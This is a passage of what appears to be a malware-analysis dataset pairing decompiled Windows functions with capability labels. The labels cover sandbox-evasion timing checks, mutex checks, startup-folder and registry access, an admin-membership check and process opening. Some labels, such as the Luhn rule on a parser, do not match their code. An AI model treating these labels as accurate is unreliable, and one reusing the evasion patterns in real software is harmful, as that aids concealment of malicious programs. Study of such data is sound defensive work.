        "decompiled_code": "\nuint __cdecl fcn.00413c47(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    uint in_EAX;\n    int32_t arg_8h_00;\n    int32_t arg_ch_00;\n    uint var_4h;\n    \n    arg_8h_00 = fcn.00412833();\n    arg_ch_00 = fcn.00412833();\n    fcn.00413339(arg_8h_00, arg_ch_00, arg_ch, arg_10h, arg_14h, in_EAX);\n    fcn.004137e3(arg_ch_00);\n    if (arg_ch_00 != 0) {\n        fcn.004137fb();\n    }\n    fcn.00412847();\n    if (arg_8h_00 != 0) {\n        fcn.004137fb();\n    }\n    fcn.00412847();\n    return 0;\n}\n",
        "token_count": 213
    },
    "00413cc2": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00413cc2(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    int32_t in_EAX;\n    int32_t arg_ch_00;\n    uint var_4h;\n    \n    arg_ch_00 = fcn.00412833();\n    fcn.0041326c(arg_ch, arg_10h, in_EAX);\n    fcn.00413c47(arg_8h, arg_ch_00, in_EAX * 2, arg_14h);\n    if (arg_ch_00 != 0) {\n        fcn.004137fb();\n    }\n    fcn.00412847();\n    return 0;\n}\n",
        "token_count": 158
    },
    "004156e4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nint32_t __cdecl fcn.004156e4(int32_t arg_8h, int32_t *arg_ch)\n\n{\n    char cVar1;\n    int32_t arg_8h_00;\n    int32_t iVar2;\n    uint var_4h;\n    \n    cVar1 = fcn.0040f912(arg_8h);\n    if (cVar1 != '\\0') {\n        cVar1 = fcn.00415279();\n        if (cVar1 == '\\0') {\n            fcn.0041528b();\n        }\n        arg_8h_00 = fcn.00415325(5);\n        if ((arg_8h_00 == 0) || (iVar2 = fcn.00415d71(arg_8h_00, arg_8h, &var_4h),  iVar2 == 0)) {\n            fcn.004153f3();\n            arg_8h_00 = 0;\n        }\n        else if (arg_ch != NULL) {\n            *arg_ch = iVar2 - arg_8h;\n        }\n        iVar2 = 0;\n        if (arg_8h_00 != 0) {\n            iVar2 = arg_8h_00;\n        }\n        return iVar2;\n    }\n    return 0;\n}\n",
        "token_count": 301
    },
    "00415769": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.00415769(void)\n\n{\n    int32_t in_EAX;\n    uint32_t uVar1;\n    uint32_t *unaff_ESI;\n    \n    uVar1 = (*_sym.imp.SHLWAPI.dll_StrSpnA)();\n    if (uVar1 != 0) {\n        if (uVar1 < *unaff_ESI) {\n            *unaff_ESI = *unaff_ESI - uVar1;\n            in_EAX = in_EAX + uVar1;\n        }\n        else {\n            in_EAX = 0;\n        }\n    }\n    return in_EAX;\n}\n",
        "token_count": 138
    },
    "0041578f": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0041578f(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t *unaff_EDI;\n    \n    *unaff_EDI = *unaff_EDI - in_EAX;\n    iVar1 = *unaff_EDI;\n    uVar2 = fcn.0040a88f(0x419064, 4, 0x5219c080, 0);\n    iVar3 = fcn.00415769(uVar2);\n    iVar4 = arg_8h + in_EAX;\n    if (iVar3 != 0) {\n        *unaff_EDI = iVar1;\n        iVar4 = iVar3;\n    }\n    return iVar4;\n}\n",
        "token_count": 190
    },
    "004157d4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.004157d4(int32_t arg_8h, uint arg_ch)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint var_10h;\n    uint var_ch;\n    int32_t var_4h;\n    \n    uVar1 = fcn.0040a88f(0x419064, 4, 0x5219c080, 0);\n    var_4h = fcn.00415769(uVar1);\n    if (var_4h != 0) {\n        var_10h = 0;\n        var_ch = 0;\n        uVar1 = fcn.0040a88f(0x419054, 5, 0xb4e125eb, 0);\n        iVar2 = fcn.0040c102(uVar1, &var_10h);\n        if (iVar2 == 0) {\n            var_4h = 0;\n        }\n        else {\n            *(arg_8h + 0x20) = var_10h;\n            *(arg_8h + 0x24) = var_ch;\n            uVar1 = fcn.0040a88f(0x41906c, 0xf, 0x7b94fb5b, 0);\n            var_4h = fcn.00415769(uVar1);\n            if (var_4h != 0) {\n                uVar1 = fcn.0040a88f(0x419064, 4, 0x5219c080, 0);\n                var_4h = fcn.00415769(uVar1);\n            }\n        }\n    }\n    return var_4h;\n}\n",
        "token_count": 378
    },
    "00415d71": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nchar * __cdecl fcn.00415d71(int32_t arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    char cVar1;\n    code *pcVar2;\n    uint uVar3;\n    char *arg_ch_00;\n    int32_t iVar4;\n    \n    uVar3 = fcn.0040a88f(0x419064, 4, 0x5219c080, 0);\n    arg_ch_00 = fcn.00415769(uVar3);\n    if (arg_ch_00 != NULL) {\n        uVar3 = fcn.0040a88f(0x41905c, 4, 0xcf63b0aa, 0);\n        pcVar2 = _sym.imp.SHLWAPI.dll_StrCmpNIA;\n        iVar4 = (*_sym.imp.SHLWAPI.dll_StrCmpNIA)(arg_ch_00, uVar3, 4);\n        if (iVar4 == 0) {\n            arg_ch_00 = fcn.0041578f(arg_ch_00);\n            *(arg_8h + 0x14) = 1;\n        }\n        else {\n            uVar3 = fcn.0040a88f(0x41904c, 5, 0xb3fb6ec8, 0);\n            iVar4 = (*pcVar2)(arg_ch_00, uVar3, 5);\n            if (iVar4 == 0) {\n                *(arg_8h + 0x20) = 0;\n                arg_ch_00 = fcn.0041578f(arg_ch_00);\n                *(arg_8h + 0x14) = 0;\n            }\n            else {\n                uVar3 = fcn.0040a88f(0x419044, 4, 0x8cc86c9f, 0);\n                iVar4 = (*pcVar2)(arg_ch_00, uVar3, 4);\n                if (iVar4 == 0) {\n                    *(arg_8h + 0x20) = 1;\n                    arg_ch_00 = fcn.0041578f(arg_ch_00);\n                    *(arg_8h + 0x14) = 0;\n                }\n                else {\n                    cVar1 = *arg_ch_00;\n                    if (cVar1 == '\\\"') {\n                        arg_ch_00 = fcn.00415896(arg_8h, arg_ch_00, arg_10h);\n                        *(arg_8h + 0x14) = 3;\n                    }\n                    else if ((cVar1 == '-') || (('/' < cVar1 && (cVar1 < ':')))) {\n                        arg_ch_00 = fcn.004157d4(arg_8h, arg_ch_00);\n                        *(arg_8h + 0x14) = 2;\n                    }\n                    else if (cVar1 == '[') {\n                        arg_ch_00 = fcn.00415b52(arg_8h, arg_ch_00);\n                        *(arg_8h + 0x14) = 4;\n                    }\n                    else if (cVar1 == '{') {\n                        arg_ch_00 = fcn.00415c2e(arg_8h, arg_ch_00, arg_10h);\n                        *(arg_8h + 0x14) = 5;\n                    }\n                    else {\n                        arg_ch_00 = NULL;\n                    }\n                }\n            }\n        }\n    }\n    return arg_ch_00;\n}\n",
        "token_count": 774
    },
    "004034f1": {
        "rules": [
            "delay execution"
        ],
        "decompiled_code": "\nvoid fcn.004034f1(void)\n\n{\n    (*_sym.imp.KERNEL32.dll_SetEvent)(*0x41c69c);\n    (*_sym.imp.KERNEL32.dll_WaitForSingleObject)(*0x41c6cc, 0xffffffff);\n    fcn.0040c13c();\n    *0x41c69c = 0;\n    fcn.0040c13c();\n    *0x41c6cc = 0;\n    return;\n}\n",
        "token_count": 105
    },
    "004051f0": {
        "rules": [
            "delay execution"
        ],
        "decompiled_code": "\nuint32_t fcn.004051f0(void)\n\n{\n    uint32_t uVar1;\n    uint8_t uVar2;\n    \n    uVar2 = 0;\n    uVar1 = fcn.00404923(fcn.004050b4 - *0x41d8d8);\n    if (uVar1 != 0) {\n        uVar1 = (*_sym.imp.KERNEL32.dll_WaitForSingleObject)(*0x41d6c8, 60000);\n        uVar2 = 1 - (uVar1 != 0);\n        if (uVar2 != 0) {\n            uVar1 = fcn.004090a9();\n            if (uVar1 != '\\0') {\n                uVar1 = (*_sym.imp.KERNEL32.dll_ExitProcess)(0);\n            }\n        }\n    }\n    return uVar1 & 0xffffff00 | uVar2;\n}\n",
        "token_count": 201
    },
    "004090a9": {
        "rules": [
            "delay execution"
        ],
        "decompiled_code": "\nuint32_t fcn.004090a9(void)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    \n    uVar5 = 0;\n    if (*0x41de28 == 0) {\n        fcn.00405e79(0x41de28);\n    }\n    pcVar1 = _sym.imp.KERNEL32.dll_GetTickCount;\n    iVar2 = (*_sym.imp.KERNEL32.dll_GetTickCount)();\n    iVar3 = (*pcVar1)();\n    do {\n        uVar4 = iVar3 - iVar2;\n        if (59999 < uVar4) {\ncode_r0x00409101:\n            return uVar4 & 0xffffff00 | uVar5;\n        }\n        uVar4 = (*_sym.imp.KERNEL32.dll_OpenEventW)(0x1f0003, 0, 0x41de28);\n        if (uVar4 != 0) {\n            uVar5 = 1;\n            goto code_r0x00409101;\n        }\n        (*_sym.imp.KERNEL32.dll_Sleep)(1);\n        iVar3 = (*pcVar1)();\n    } while( true );\n}\n",
        "token_count": 274
    },
    "0040cb5b": {
        "rules": [
            "delay execution"
        ],
        "decompiled_code": "\nbool fcn.0040cb5b(void)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint unaff_ESI;\n    int32_t iVar3;\n    bool bVar4;\n    \n    cVar1 = fcn.0040f898();\n    if (cVar1 == '\\0') {\n        bVar4 = false;\n    }\n    else {\n        (*_sym.imp.KERNEL32.dll_SetFileAttributesW)();\n        iVar3 = 0;\n        while( true ) {\n            cVar1 = fcn.0040cae1(unaff_ESI);\n            bVar4 = cVar1 != '\\0';\n            if ((bVar4) || (0x14 < iVar3)) break;\n            iVar2 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n            if (iVar2 == 2) {\n                return iVar2 == 2;\n            }\n            (*_sym.imp.KERNEL32.dll_Sleep)(10);\n            iVar3 = iVar3 + 1;\n        }\n    }\n    return bVar4;\n}\n",
        "token_count": 227
    },
    "00402414": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00402414(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    code *pcVar1;\n    char cVar2;\n    int32_t iVar3;\n    uint var_224h;\n    int32_t var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    uint var_8h;\n    \n    pcVar1 = _sym.imp.ADVAPI32.dll_RegEnumValueW;\n    var_ch = 0;\n    while( true ) {\n        var_8h = 0x104;\n        iVar3 = (*pcVar1)(arg_8h, var_ch, &var_224h, &var_8h, 0, 0, 0, 0);\n        if (iVar3 == 0x103) break;\n        if (iVar3 == 0) {\n            var_14h = fcn.00402034(arg_8h, &var_224h);\n            if (var_14h != 0) {\n                iVar3 = fcn.00402088(var_14h);\n                var_18h = iVar3;\n                if (iVar3 != 0) {\n                    cVar2 = fcn.00402333(iVar3, arg_ch);\n                    if (cVar2 != '\\0') {\n                        (*_sym.imp.SHLWAPI.dll_PathFindFileNameW)(iVar3);\n                        var_10h = fcn.0040bd22(iVar3);\n                        if (var_10h != 0) {\n                            fcn.00401ba1(var_10h, arg_10h);\n                            fcn.0040af12();\n                        }\n                    }\n                    fcn.0040af12();\n                }\n                fcn.0040af12();\n            }\n        }\n        var_ch = var_ch + 1;\n    }\n    return;\n}\n",
        "token_count": 418
    },
    "0040642d": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "get common file path"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040642d(uint arg_8h)\n\n{\n    uint uVar1;\n    uint pszPath;\n    \n    if (*0x41e3f0 == '\\0') {\n        *0x41e3f0 = '\\x01';\n        fcn.00409283(arg_8h);\n        (*_sym.imp.SHELL32.dll_SHGetFolderPathW)(0, 0, 0, 0, &pszPath);\n        fcn.00409804(&pszPath);\n        uVar1 = fcn.00409aaf();\n        fcn.00407bcd(arg_8h, uVar1);\n    }\n    return;\n}\n",
        "token_count": 146
    },
    "004089b9": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nbool fcn.004089b9(void)\n\n{\n    int32_t iVar1;\n    uint plii;\n    int32_t var_4h;\n    \n    iVar1 = (*_sym.imp.KERNEL32.dll_GetTickCount)();\n    plii = 8;\n    (*_sym.imp.USER32.dll_GetLastInputInfo)(&plii);\n    return *0x41de20 <= (iVar1 - var_4h) / 1000;\n}\n",
        "token_count": 97
    },
    "0040a7b7": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t fcn.0040a7b7(void)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    uint var_ch;\n    uint var_4h;\n    \n    uVar1 = *0x41bb18 & 0x1896e03;\n    uVar2 = uVar1;\n    if ((uVar1 <= (*0x41bb18 ^ 0x62)) && (uVar1 + 0xdd < var_4h)) {\n        uVar2 = uVar1 << (var_ch & 0x1f);\n        uVar1 = *0x41bb18;\n    }\n    *0x41bb18 = uVar1 | uVar2;\n    return (uVar1 | uVar2) & 0xffffff00 | var_4h;\n}\n",
        "token_count": 191
    },
    "0040b00a": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "contain loop"
        ],
        "decompiled_code": "\nulong __cdecl fcn.0040b00a(uint arg_8h)\n\n{\n    int16_t in_CX;\n    uint8_t in_DL;\n    int32_t iVar1;\n    bool bVar2;\n    uint var_4h;\n    \n    if ((in_CX + -0x4a <= *0x41e3fd) || (*0x41e3fd != *0x41b13c)) {\n        in_CX = in_CX >> (in_DL & 0x1f);\n    }\n    bVar2 = in_DL >> (arg_8h & 0x1f) != 0;\n    iVar1 = 5;\n    do {\n        *0x41e3fd = *0x41e3fd >> bVar2 != 0;\n        iVar1 = iVar1 + -1;\n    } while (iVar1 != 0);\n    if (in_CX - 0x23U != *0x41e3fd) {\n        *0x41e3fd = *0x41e3fd != bVar2;\n    }\n    return 0x7347ff;\n}\n",
        "token_count": 248
    },
    "0040bc3b": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "get token membership"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t fcn.0040bc3b(void)\n\n{\n    int32_t iVar1;\n    uint pIdentifierAuthority;\n    uint var_ch;\n    uint SidToCheck;\n    int32_t IsMember;\n    \n    pIdentifierAuthority = 0;\n    var_ch._0_2_ = 0x500;\n    IsMember = (*_sym.imp.ADVAPI32.dll_AllocateAndInitializeSid)\n                         (&pIdentifierAuthority, 2, 0x20, 0x220, 0, 0, 0, 0, 0, 0, &SidToCheck);\n    if (IsMember != 0) {\n        iVar1 = (*_sym.imp.ADVAPI32.dll_CheckTokenMembership)(0, SidToCheck, &IsMember);\n        if (iVar1 == 0) {\n            IsMember = 0;\n        }\n        (*_sym.imp.ADVAPI32.dll_FreeSid)(SidToCheck);\n    }\n    return IsMember;\n}\n",
        "token_count": 221
    },
    "00401a9e": {
        "rules": [
            "create thread"
        ],
        "decompiled_code": "\nvoid fcn.00401a9e(void)\n\n{\n    int32_t iVar1;\n    \n    (*_sym.imp.KERNEL32.dll_AllocConsole)();\n    (*_sym.imp.KERNEL32.dll_SetConsoleCtrlHandler)(0x4019d0, 1);\n    iVar1 = (*_sym.imp.USER32.dll_FindWindowW)(0, 0x41dc10);\n    if ((iVar1 != 0) && (iVar1 = (*_sym.imp.USER32.dll_GetSystemMenu)(iVar1, 0),  iVar1 != 0)) {\n        (*_sym.imp.USER32.dll_EnableMenuItem)(iVar1, 0xf060, 1);\n        (*_sym.imp.USER32.dll_DeleteMenu)(iVar1, 0xf060, 0);\n    }\n    (*_sym.imp.KERNEL32.dll_CreateThread)(0, 0, fcn.004019d6, 0, 0, 0);\n    fcn.0040c13c();\n    return;\n}\n",
        "token_count": 215
    },
    "00403532": {
        "rules": [
            "create thread"
        ],
        "decompiled_code": "\nvoid fcn.00403532(void)\n\n{\n    *0x41c69c = (*_sym.imp.KERNEL32.dll_CreateEventW)(0, 1, 0, 0);\n    *0x41c6cc = (*_sym.imp.KERNEL32.dll_CreateThread)(0, 0, 0x4034d1, 0, 0, 0);\n    return;\n}\n",
        "token_count": 89
    },
    "00411175": {
        "rules": [
            "create thread"
        ],
        "decompiled_code": "\nint32_t fcn.00411175(uint param_1, uint param_2)\n\n{\n    uint *puVar1;\n    int32_t iVar2;\n    \n    puVar1 = fcn.0040ae05(0);\n    puVar1[1] = param_2;\n    *puVar1 = param_1;\n    iVar2 = (*_sym.imp.KERNEL32.dll_CreateThread)(0, 0, 0x411132, puVar1, 0, 0);\n    if (iVar2 == 0) {\n        fcn.0040af12();\n    }\n    return iVar2;\n}\n",
        "token_count": 136
    },
    "0040a5cd": {
        "rules": [
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\nint32_t fcn.0040a5cd(int32_t *param_1, uint param_2)\n\n{\n    int32_t arg_8h;\n    \n    *0x41df44 = 0;\n    arg_8h = fcn.0040a484();\n    if (arg_8h != 0) {\n        fcn.0040a4b6(arg_8h, param_2);\n        *param_1 = arg_8h;\n    }\n    return *0x41df54 + 1;\n}\n",
        "token_count": 118
    },
    "0041540b": {
        "rules": [
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\nint32_t fcn.0041540b(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    \n    iVar2 = 0;\n    cVar1 = fcn.004152ab();\n    if (cVar1 != '\\0') {\n        iVar2 = fcn.00415325(5);\n        if (iVar2 != 0) {\n            *(iVar2 + 0x14) = *(in_EAX + 0x14);\n            *(iVar2 + 0x20) = *(in_EAX + 0x20);\n            *(iVar2 + 0x24) = *(in_EAX + 0x24);\n            *(iVar2 + 0x10) = *(in_EAX + 0x10);\n            *(iVar2 + 0x18) = 1;\n        }\n    }\n    return iVar2;\n}\n",
        "token_count": 197
    },
    "00402c6e": {
        "rules": [
            "create or open registry key",
            "query or enumerate registry value"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00402c6e(uint lpSubKey, uint arg_ch)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t var_8h;\n    uint phkResult;\n    \n    iVar3 = 0;\n    iVar2 = (*_sym.imp.ADVAPI32.dll_RegOpenKeyExW)(0x80000002, lpSubKey, 0, 0x20119, &phkResult);\n    pcVar1 = _sym.imp.ADVAPI32.dll_RegQueryValueExW;\n    if (iVar2 == 0) {\n        iVar2 = (*_sym.imp.ADVAPI32.dll_RegQueryValueExW)(phkResult, arg_ch, 0, 0, 0, &var_8h);\n        if ((iVar2 == 0) && (var_8h != 0)) {\n            iVar3 = fcn.0040ae05(0);\n            if (iVar3 != 0) {\n                iVar2 = (*pcVar1)(phkResult, arg_ch, 0, 0, iVar3, &var_8h);\n                if (iVar2 != 0) {\n                    fcn.0040af12();\n                    iVar3 = 0;\n                }\n            }\n        }\n        (*_sym.imp.ADVAPI32.dll_RegCloseKey)(phkResult);\n    }\n    return iVar3;\n}\n",
        "token_count": 314
    },
    "0040a66b": {
        "rules": [
            "create or open registry key",
            "query or enumerate registry value"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0040a66b(uint hKey, uint lpSubKey, uint arg_10h, uint *arg_14h)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar3 = 0;\n    iVar2 = (*_sym.imp.ADVAPI32.dll_RegCreateKeyExW)(hKey, lpSubKey, 0, 0, 0, 0x20119, 0, &var_8h, 0);\n    pcVar1 = _sym.imp.ADVAPI32.dll_RegQueryValueExW;\n    if (iVar2 == 0) {\n        var_4h = 0;\n        iVar2 = (*_sym.imp.ADVAPI32.dll_RegQueryValueExW)(var_8h, arg_10h, 0, 0, 0, &var_4h);\n        if (iVar2 == 0) {\n            iVar3 = fcn.0040ae05(0);\n            if (iVar3 != 0) {\n                iVar2 = (*pcVar1)(var_8h, arg_10h, 0, 0, iVar3, &var_4h);\n                if (iVar2 == 0) {\n                    if (arg_14h != NULL) {\n                        *arg_14h = var_4h;\n                    }\n                }\n                else {\n                    fcn.0040af12();\n                    iVar3 = 0;\n                }\n            }\n        }\n        (*_sym.imp.ADVAPI32.dll_RegCloseKey)(var_8h);\n    }\n    return iVar3;\n}\n",
        "token_count": 372
    },
    "0040a731": {
        "rules": [
            "create or open registry key",
            "set registry value"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.0040a731(uint hKey, uint lpSubKey, uint lpValueName, uint dwType, uint lpData, uint cbData)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint var_4h;\n    \n    uVar3 = 0;\n    uVar1 = (*_sym.imp.ADVAPI32.dll_RegCreateKeyExW)(hKey, lpSubKey, 0, 0, 0, 0x20106, 0, &var_4h, 0);\n    if (uVar1 == 0) {\n        iVar2 = (*_sym.imp.ADVAPI32.dll_RegSetValueExW)(var_4h, lpValueName, 0, dwType, lpData, cbData);\n        uVar3 = 1 - (iVar2 != 0);\n        (*_sym.imp.ADVAPI32.dll_RegFlushKey)(var_4h);\n        uVar1 = (*_sym.imp.ADVAPI32.dll_RegCloseKey)(var_4h);\n    }\n    return uVar1 & 0xffffff00 | uVar3;\n}\n",
        "token_count": 258
    },
    "0040288a": {
        "rules": [
            "check mutex"
        ],
        "decompiled_code": "\nuint32_t fcn.0040288a(uint param_1)\n\n{\n    uint32_t uVar1;\n    bool bVar2;\n    \n    uVar1 = (*_sym.imp.KERNEL32.dll_OpenMutexW)(0x100000, 0, param_1);\n    bVar2 = uVar1 != 0;\n    if (bVar2) {\n        uVar1 = fcn.0040c13c();\n    }\n    return uVar1 & 0xffffff00 | bVar2;\n}\n",
        "token_count": 113
    },
    "00406406": {
        "rules": [
            "check mutex"
        ],
        "decompiled_code": "\nuint32_t fcn.00406406(void)\n\n{\n    uint32_t uVar1;\n    bool bVar2;\n    \n    uVar1 = (*_sym.imp.KERNEL32.dll_OpenMutexW)(0x100000, 0, 0x41daf0);\n    bVar2 = uVar1 != 0;\n    if (bVar2) {\n        uVar1 = fcn.0040c13c();\n    }\n    return uVar1 & 0xffffff00 | bVar2;\n}\n",
        "token_count": 112
    },
    "0040afe7": {
        "rules": [
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\nuchar __fastcall fcn.0040afe7(uint16_t *param_1)\n\n{\n    uchar uStack1;\n    \n    *0x41e3fd = (*0x41b13c & 0x8000) != 0;\n    *param_1 = *param_1 & *0x41e3fd;\n    uStack1 = param_1 >> 0x18;\n    return uStack1;\n}\n",
        "token_count": 94
    },
    "0040c210": {
        "rules": [
            "allocate memory",
            "allocate RW memory"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_24h\n// WARNING: Variable defined which should be unmapped: var_20h\n// WARNING: Variable defined which should be unmapped: var_34h\n// WARNING: Variable defined which should be unmapped: var_30h\n// WARNING: Variable defined which should be unmapped: var_2ch\n// WARNING: Variable defined which should be unmapped: lpflOldProtect\n// WARNING: Variable defined which should be unmapped: var_40h\n// WARNING: Variable defined which should be unmapped: var_3ch\n// WARNING: Variable defined which should be unmapped: var_38h\n\nvoid __cdecl fcn.0040c210(uint dwDesiredAccess, uint dwProcessId)\n\n{\n    uint *puVar1;\n    int32_t iVar2;\n    int32_t unaff_EBP;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint lpflOldProtect;\n    uint var_24h;\n    uint var_20h;\n    uint var_4h;\n    \n    fcn.00415eec(0x4190b0, 0x30);\n    *(unaff_EBP + -0x20) = 0;\n    puVar1 = (*_sym.imp.KERNEL32.dll_VirtualAlloc)(0, 8, 0x3000, 4);\n    *(unaff_EBP + -0x24) = puVar1;\n    if (puVar1 != NULL) {\n        *puVar1 = *(unaff_EBP + 0xc);\n        puVar1[1] = 0;\n        (*_sym.imp.KERNEL32.dll_VirtualProtect)(puVar1, 8, 0x104, unaff_EBP + -0x28);\n        *(unaff_EBP + -0x40) = 0x18;\n        *(unaff_EBP + -0x3c) = 0;\n        *(unaff_EBP + -0x34) = 0;\n        *(unaff_EBP + -0x38) = 0;\n        *(unaff_EBP + -0x30) = 0;\n        *(unaff_EBP + -0x2c) = 0;\n        *(unaff_EBP + -4) = 0;\n        iVar2 = (*_sym.imp.ntdll.dll_ZwOpenProcess)(unaff_EBP + -0x20, *(unaff_EBP + 8), unaff_EBP + -0x40, puVar1);\n        if (iVar2 < 0) {\n            *(unaff_EBP + -0x20) = 0;\n        }\n        puVar1[1] = 0;\n        *(unaff_EBP + -4) = 0xffffffff;\n        (*_sym.imp.KERNEL32.dll_VirtualFree)(puVar1, 0, 0x8000);\n    }\n    if (*(unaff_EBP + -0x20) == 0) {\n        (*_sym.imp.KERNEL32.dll_OpenProcess)(*(unaff_EBP + 8), 0, *(unaff_EBP + 0xc));\n    }\n    fcn.00415f27();\n    return;\n}\n",
        "token_count": 745
    },
    "0040d274": {
        "rules": [
            "get startup folder"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040d274(uint lpString1)\n\n{\n    code *pcVar1;\n    char cVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint uVar5;\n    uint psz2;\n    uint lpString;\n    \n    uVar5 = 0;\n    cVar2 = fcn.0040f871(lpString1, 0x208);\n    pcVar1 = _sym.imp.SHELL32.dll_SHGetFolderPathW;\n    if (((cVar2 != '\\0') &&\n        (iVar3 = (*_sym.imp.SHELL32.dll_SHGetFolderPathW)(0, 0x28, 0xffffffff, 1, &lpString),  iVar3 == 0)) &&\n       (iVar3 = (*pcVar1)(0, 7, 0xffffffff, 1, &psz2),  iVar3 == 0)) {\n        iVar3 = (*_sym.imp.KERNEL32.dll_lstrlenW)(&lpString);\n        iVar4 = (*_sym.imp.SHLWAPI.dll_StrCmpNIW)(&lpString, &psz2, iVar3);\n        if (iVar4 == 0) {\n            (*_sym.imp.KERNEL32.dll_lstrcpyW)(lpString1, &psz2 + iVar3 * 2 + 2);\n            uVar5 = 1;\n        }\n    }\n    return uVar5;\n}\n",
        "token_count": 305
    },
    "0040dbea": {
        "rules": [
            "encode data using XOR"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040dbea(int32_t arg_8h, uint32_t arg_ch, int32_t arg_10h, uint32_t arg_14h)\n\n{\n    uchar uVar1;\n    uint32_t uVar2;\n    \n    (*_sym.imp.KERNEL32.dll_GetTickCount)();\n    uVar2 = 0;\n    if ((arg_10h != 0) && (arg_14h != 0)) {\n        do {\n            uVar2 = uVar2 + 1;\n        } while (uVar2 < arg_14h);\n    }\n    uVar2 = 0;\n    if (arg_ch != 0) {\n        do {\n            uVar1 = fcn.0040c985();\n            *(uVar2 + arg_8h) = uVar1;\n            uVar2 = uVar2 + 1;\n        } while (uVar2 < arg_ch);\n    }\n    fcn.0040f161(arg_8h);\n    return 0;\n}\n",
        "token_count": 223
    },
    "0040d45a": {
        "rules": [
            "get common file path"
        ],
        "decompiled_code": "\nbool fcn.0040d45a(void)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    \n    cVar1 = fcn.0040f871();\n    if (cVar1 == '\\0') {\n        return false;\n    }\n    iVar2 = fcn.0040c40d();\n    if (iVar2 == 0) {\n        iVar2 = (*_sym.imp.KERNEL32.dll_GetSystemDirectoryW)();\n    }\n    else {\n        iVar2 = (*_sym.imp.KERNEL32.dll_GetSystemWow64DirectoryW)();\n    }\n    return iVar2 != 0;\n}\n",
        "token_count": 132
    },
    "004010a9": {
        "rules": [
            "query environment variable"
        ],
        "decompiled_code": "\nuint fcn.004010a9(int16_t *param_1)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint uVar3;\n    \n    pcVar1 = _sym.imp.KERNEL32.dll_ExpandEnvironmentStringsW;\n    uVar3 = 0;\n    if (((param_1 != NULL) && (*param_1 != 0)) &&\n       (iVar2 = (*_sym.imp.KERNEL32.dll_ExpandEnvironmentStringsW)(param_1, 0, 0),  iVar2 != 0)) {\n        uVar3 = fcn.0040ae05(0);\n        iVar2 = (*pcVar1)(param_1, uVar3, iVar2);\n        if (iVar2 == 0) {\n            fcn.0040af12();\n            uVar3 = 0;\n        }\n        else {\n            (*_sym.imp.SHLWAPI.dll_PathUnquoteSpacesW)(uVar3);\n        }\n    }\n    return uVar3;\n}\n",
        "token_count": 219
    },
    "00402837": {
        "rules": [
            "contain loop"
        ],
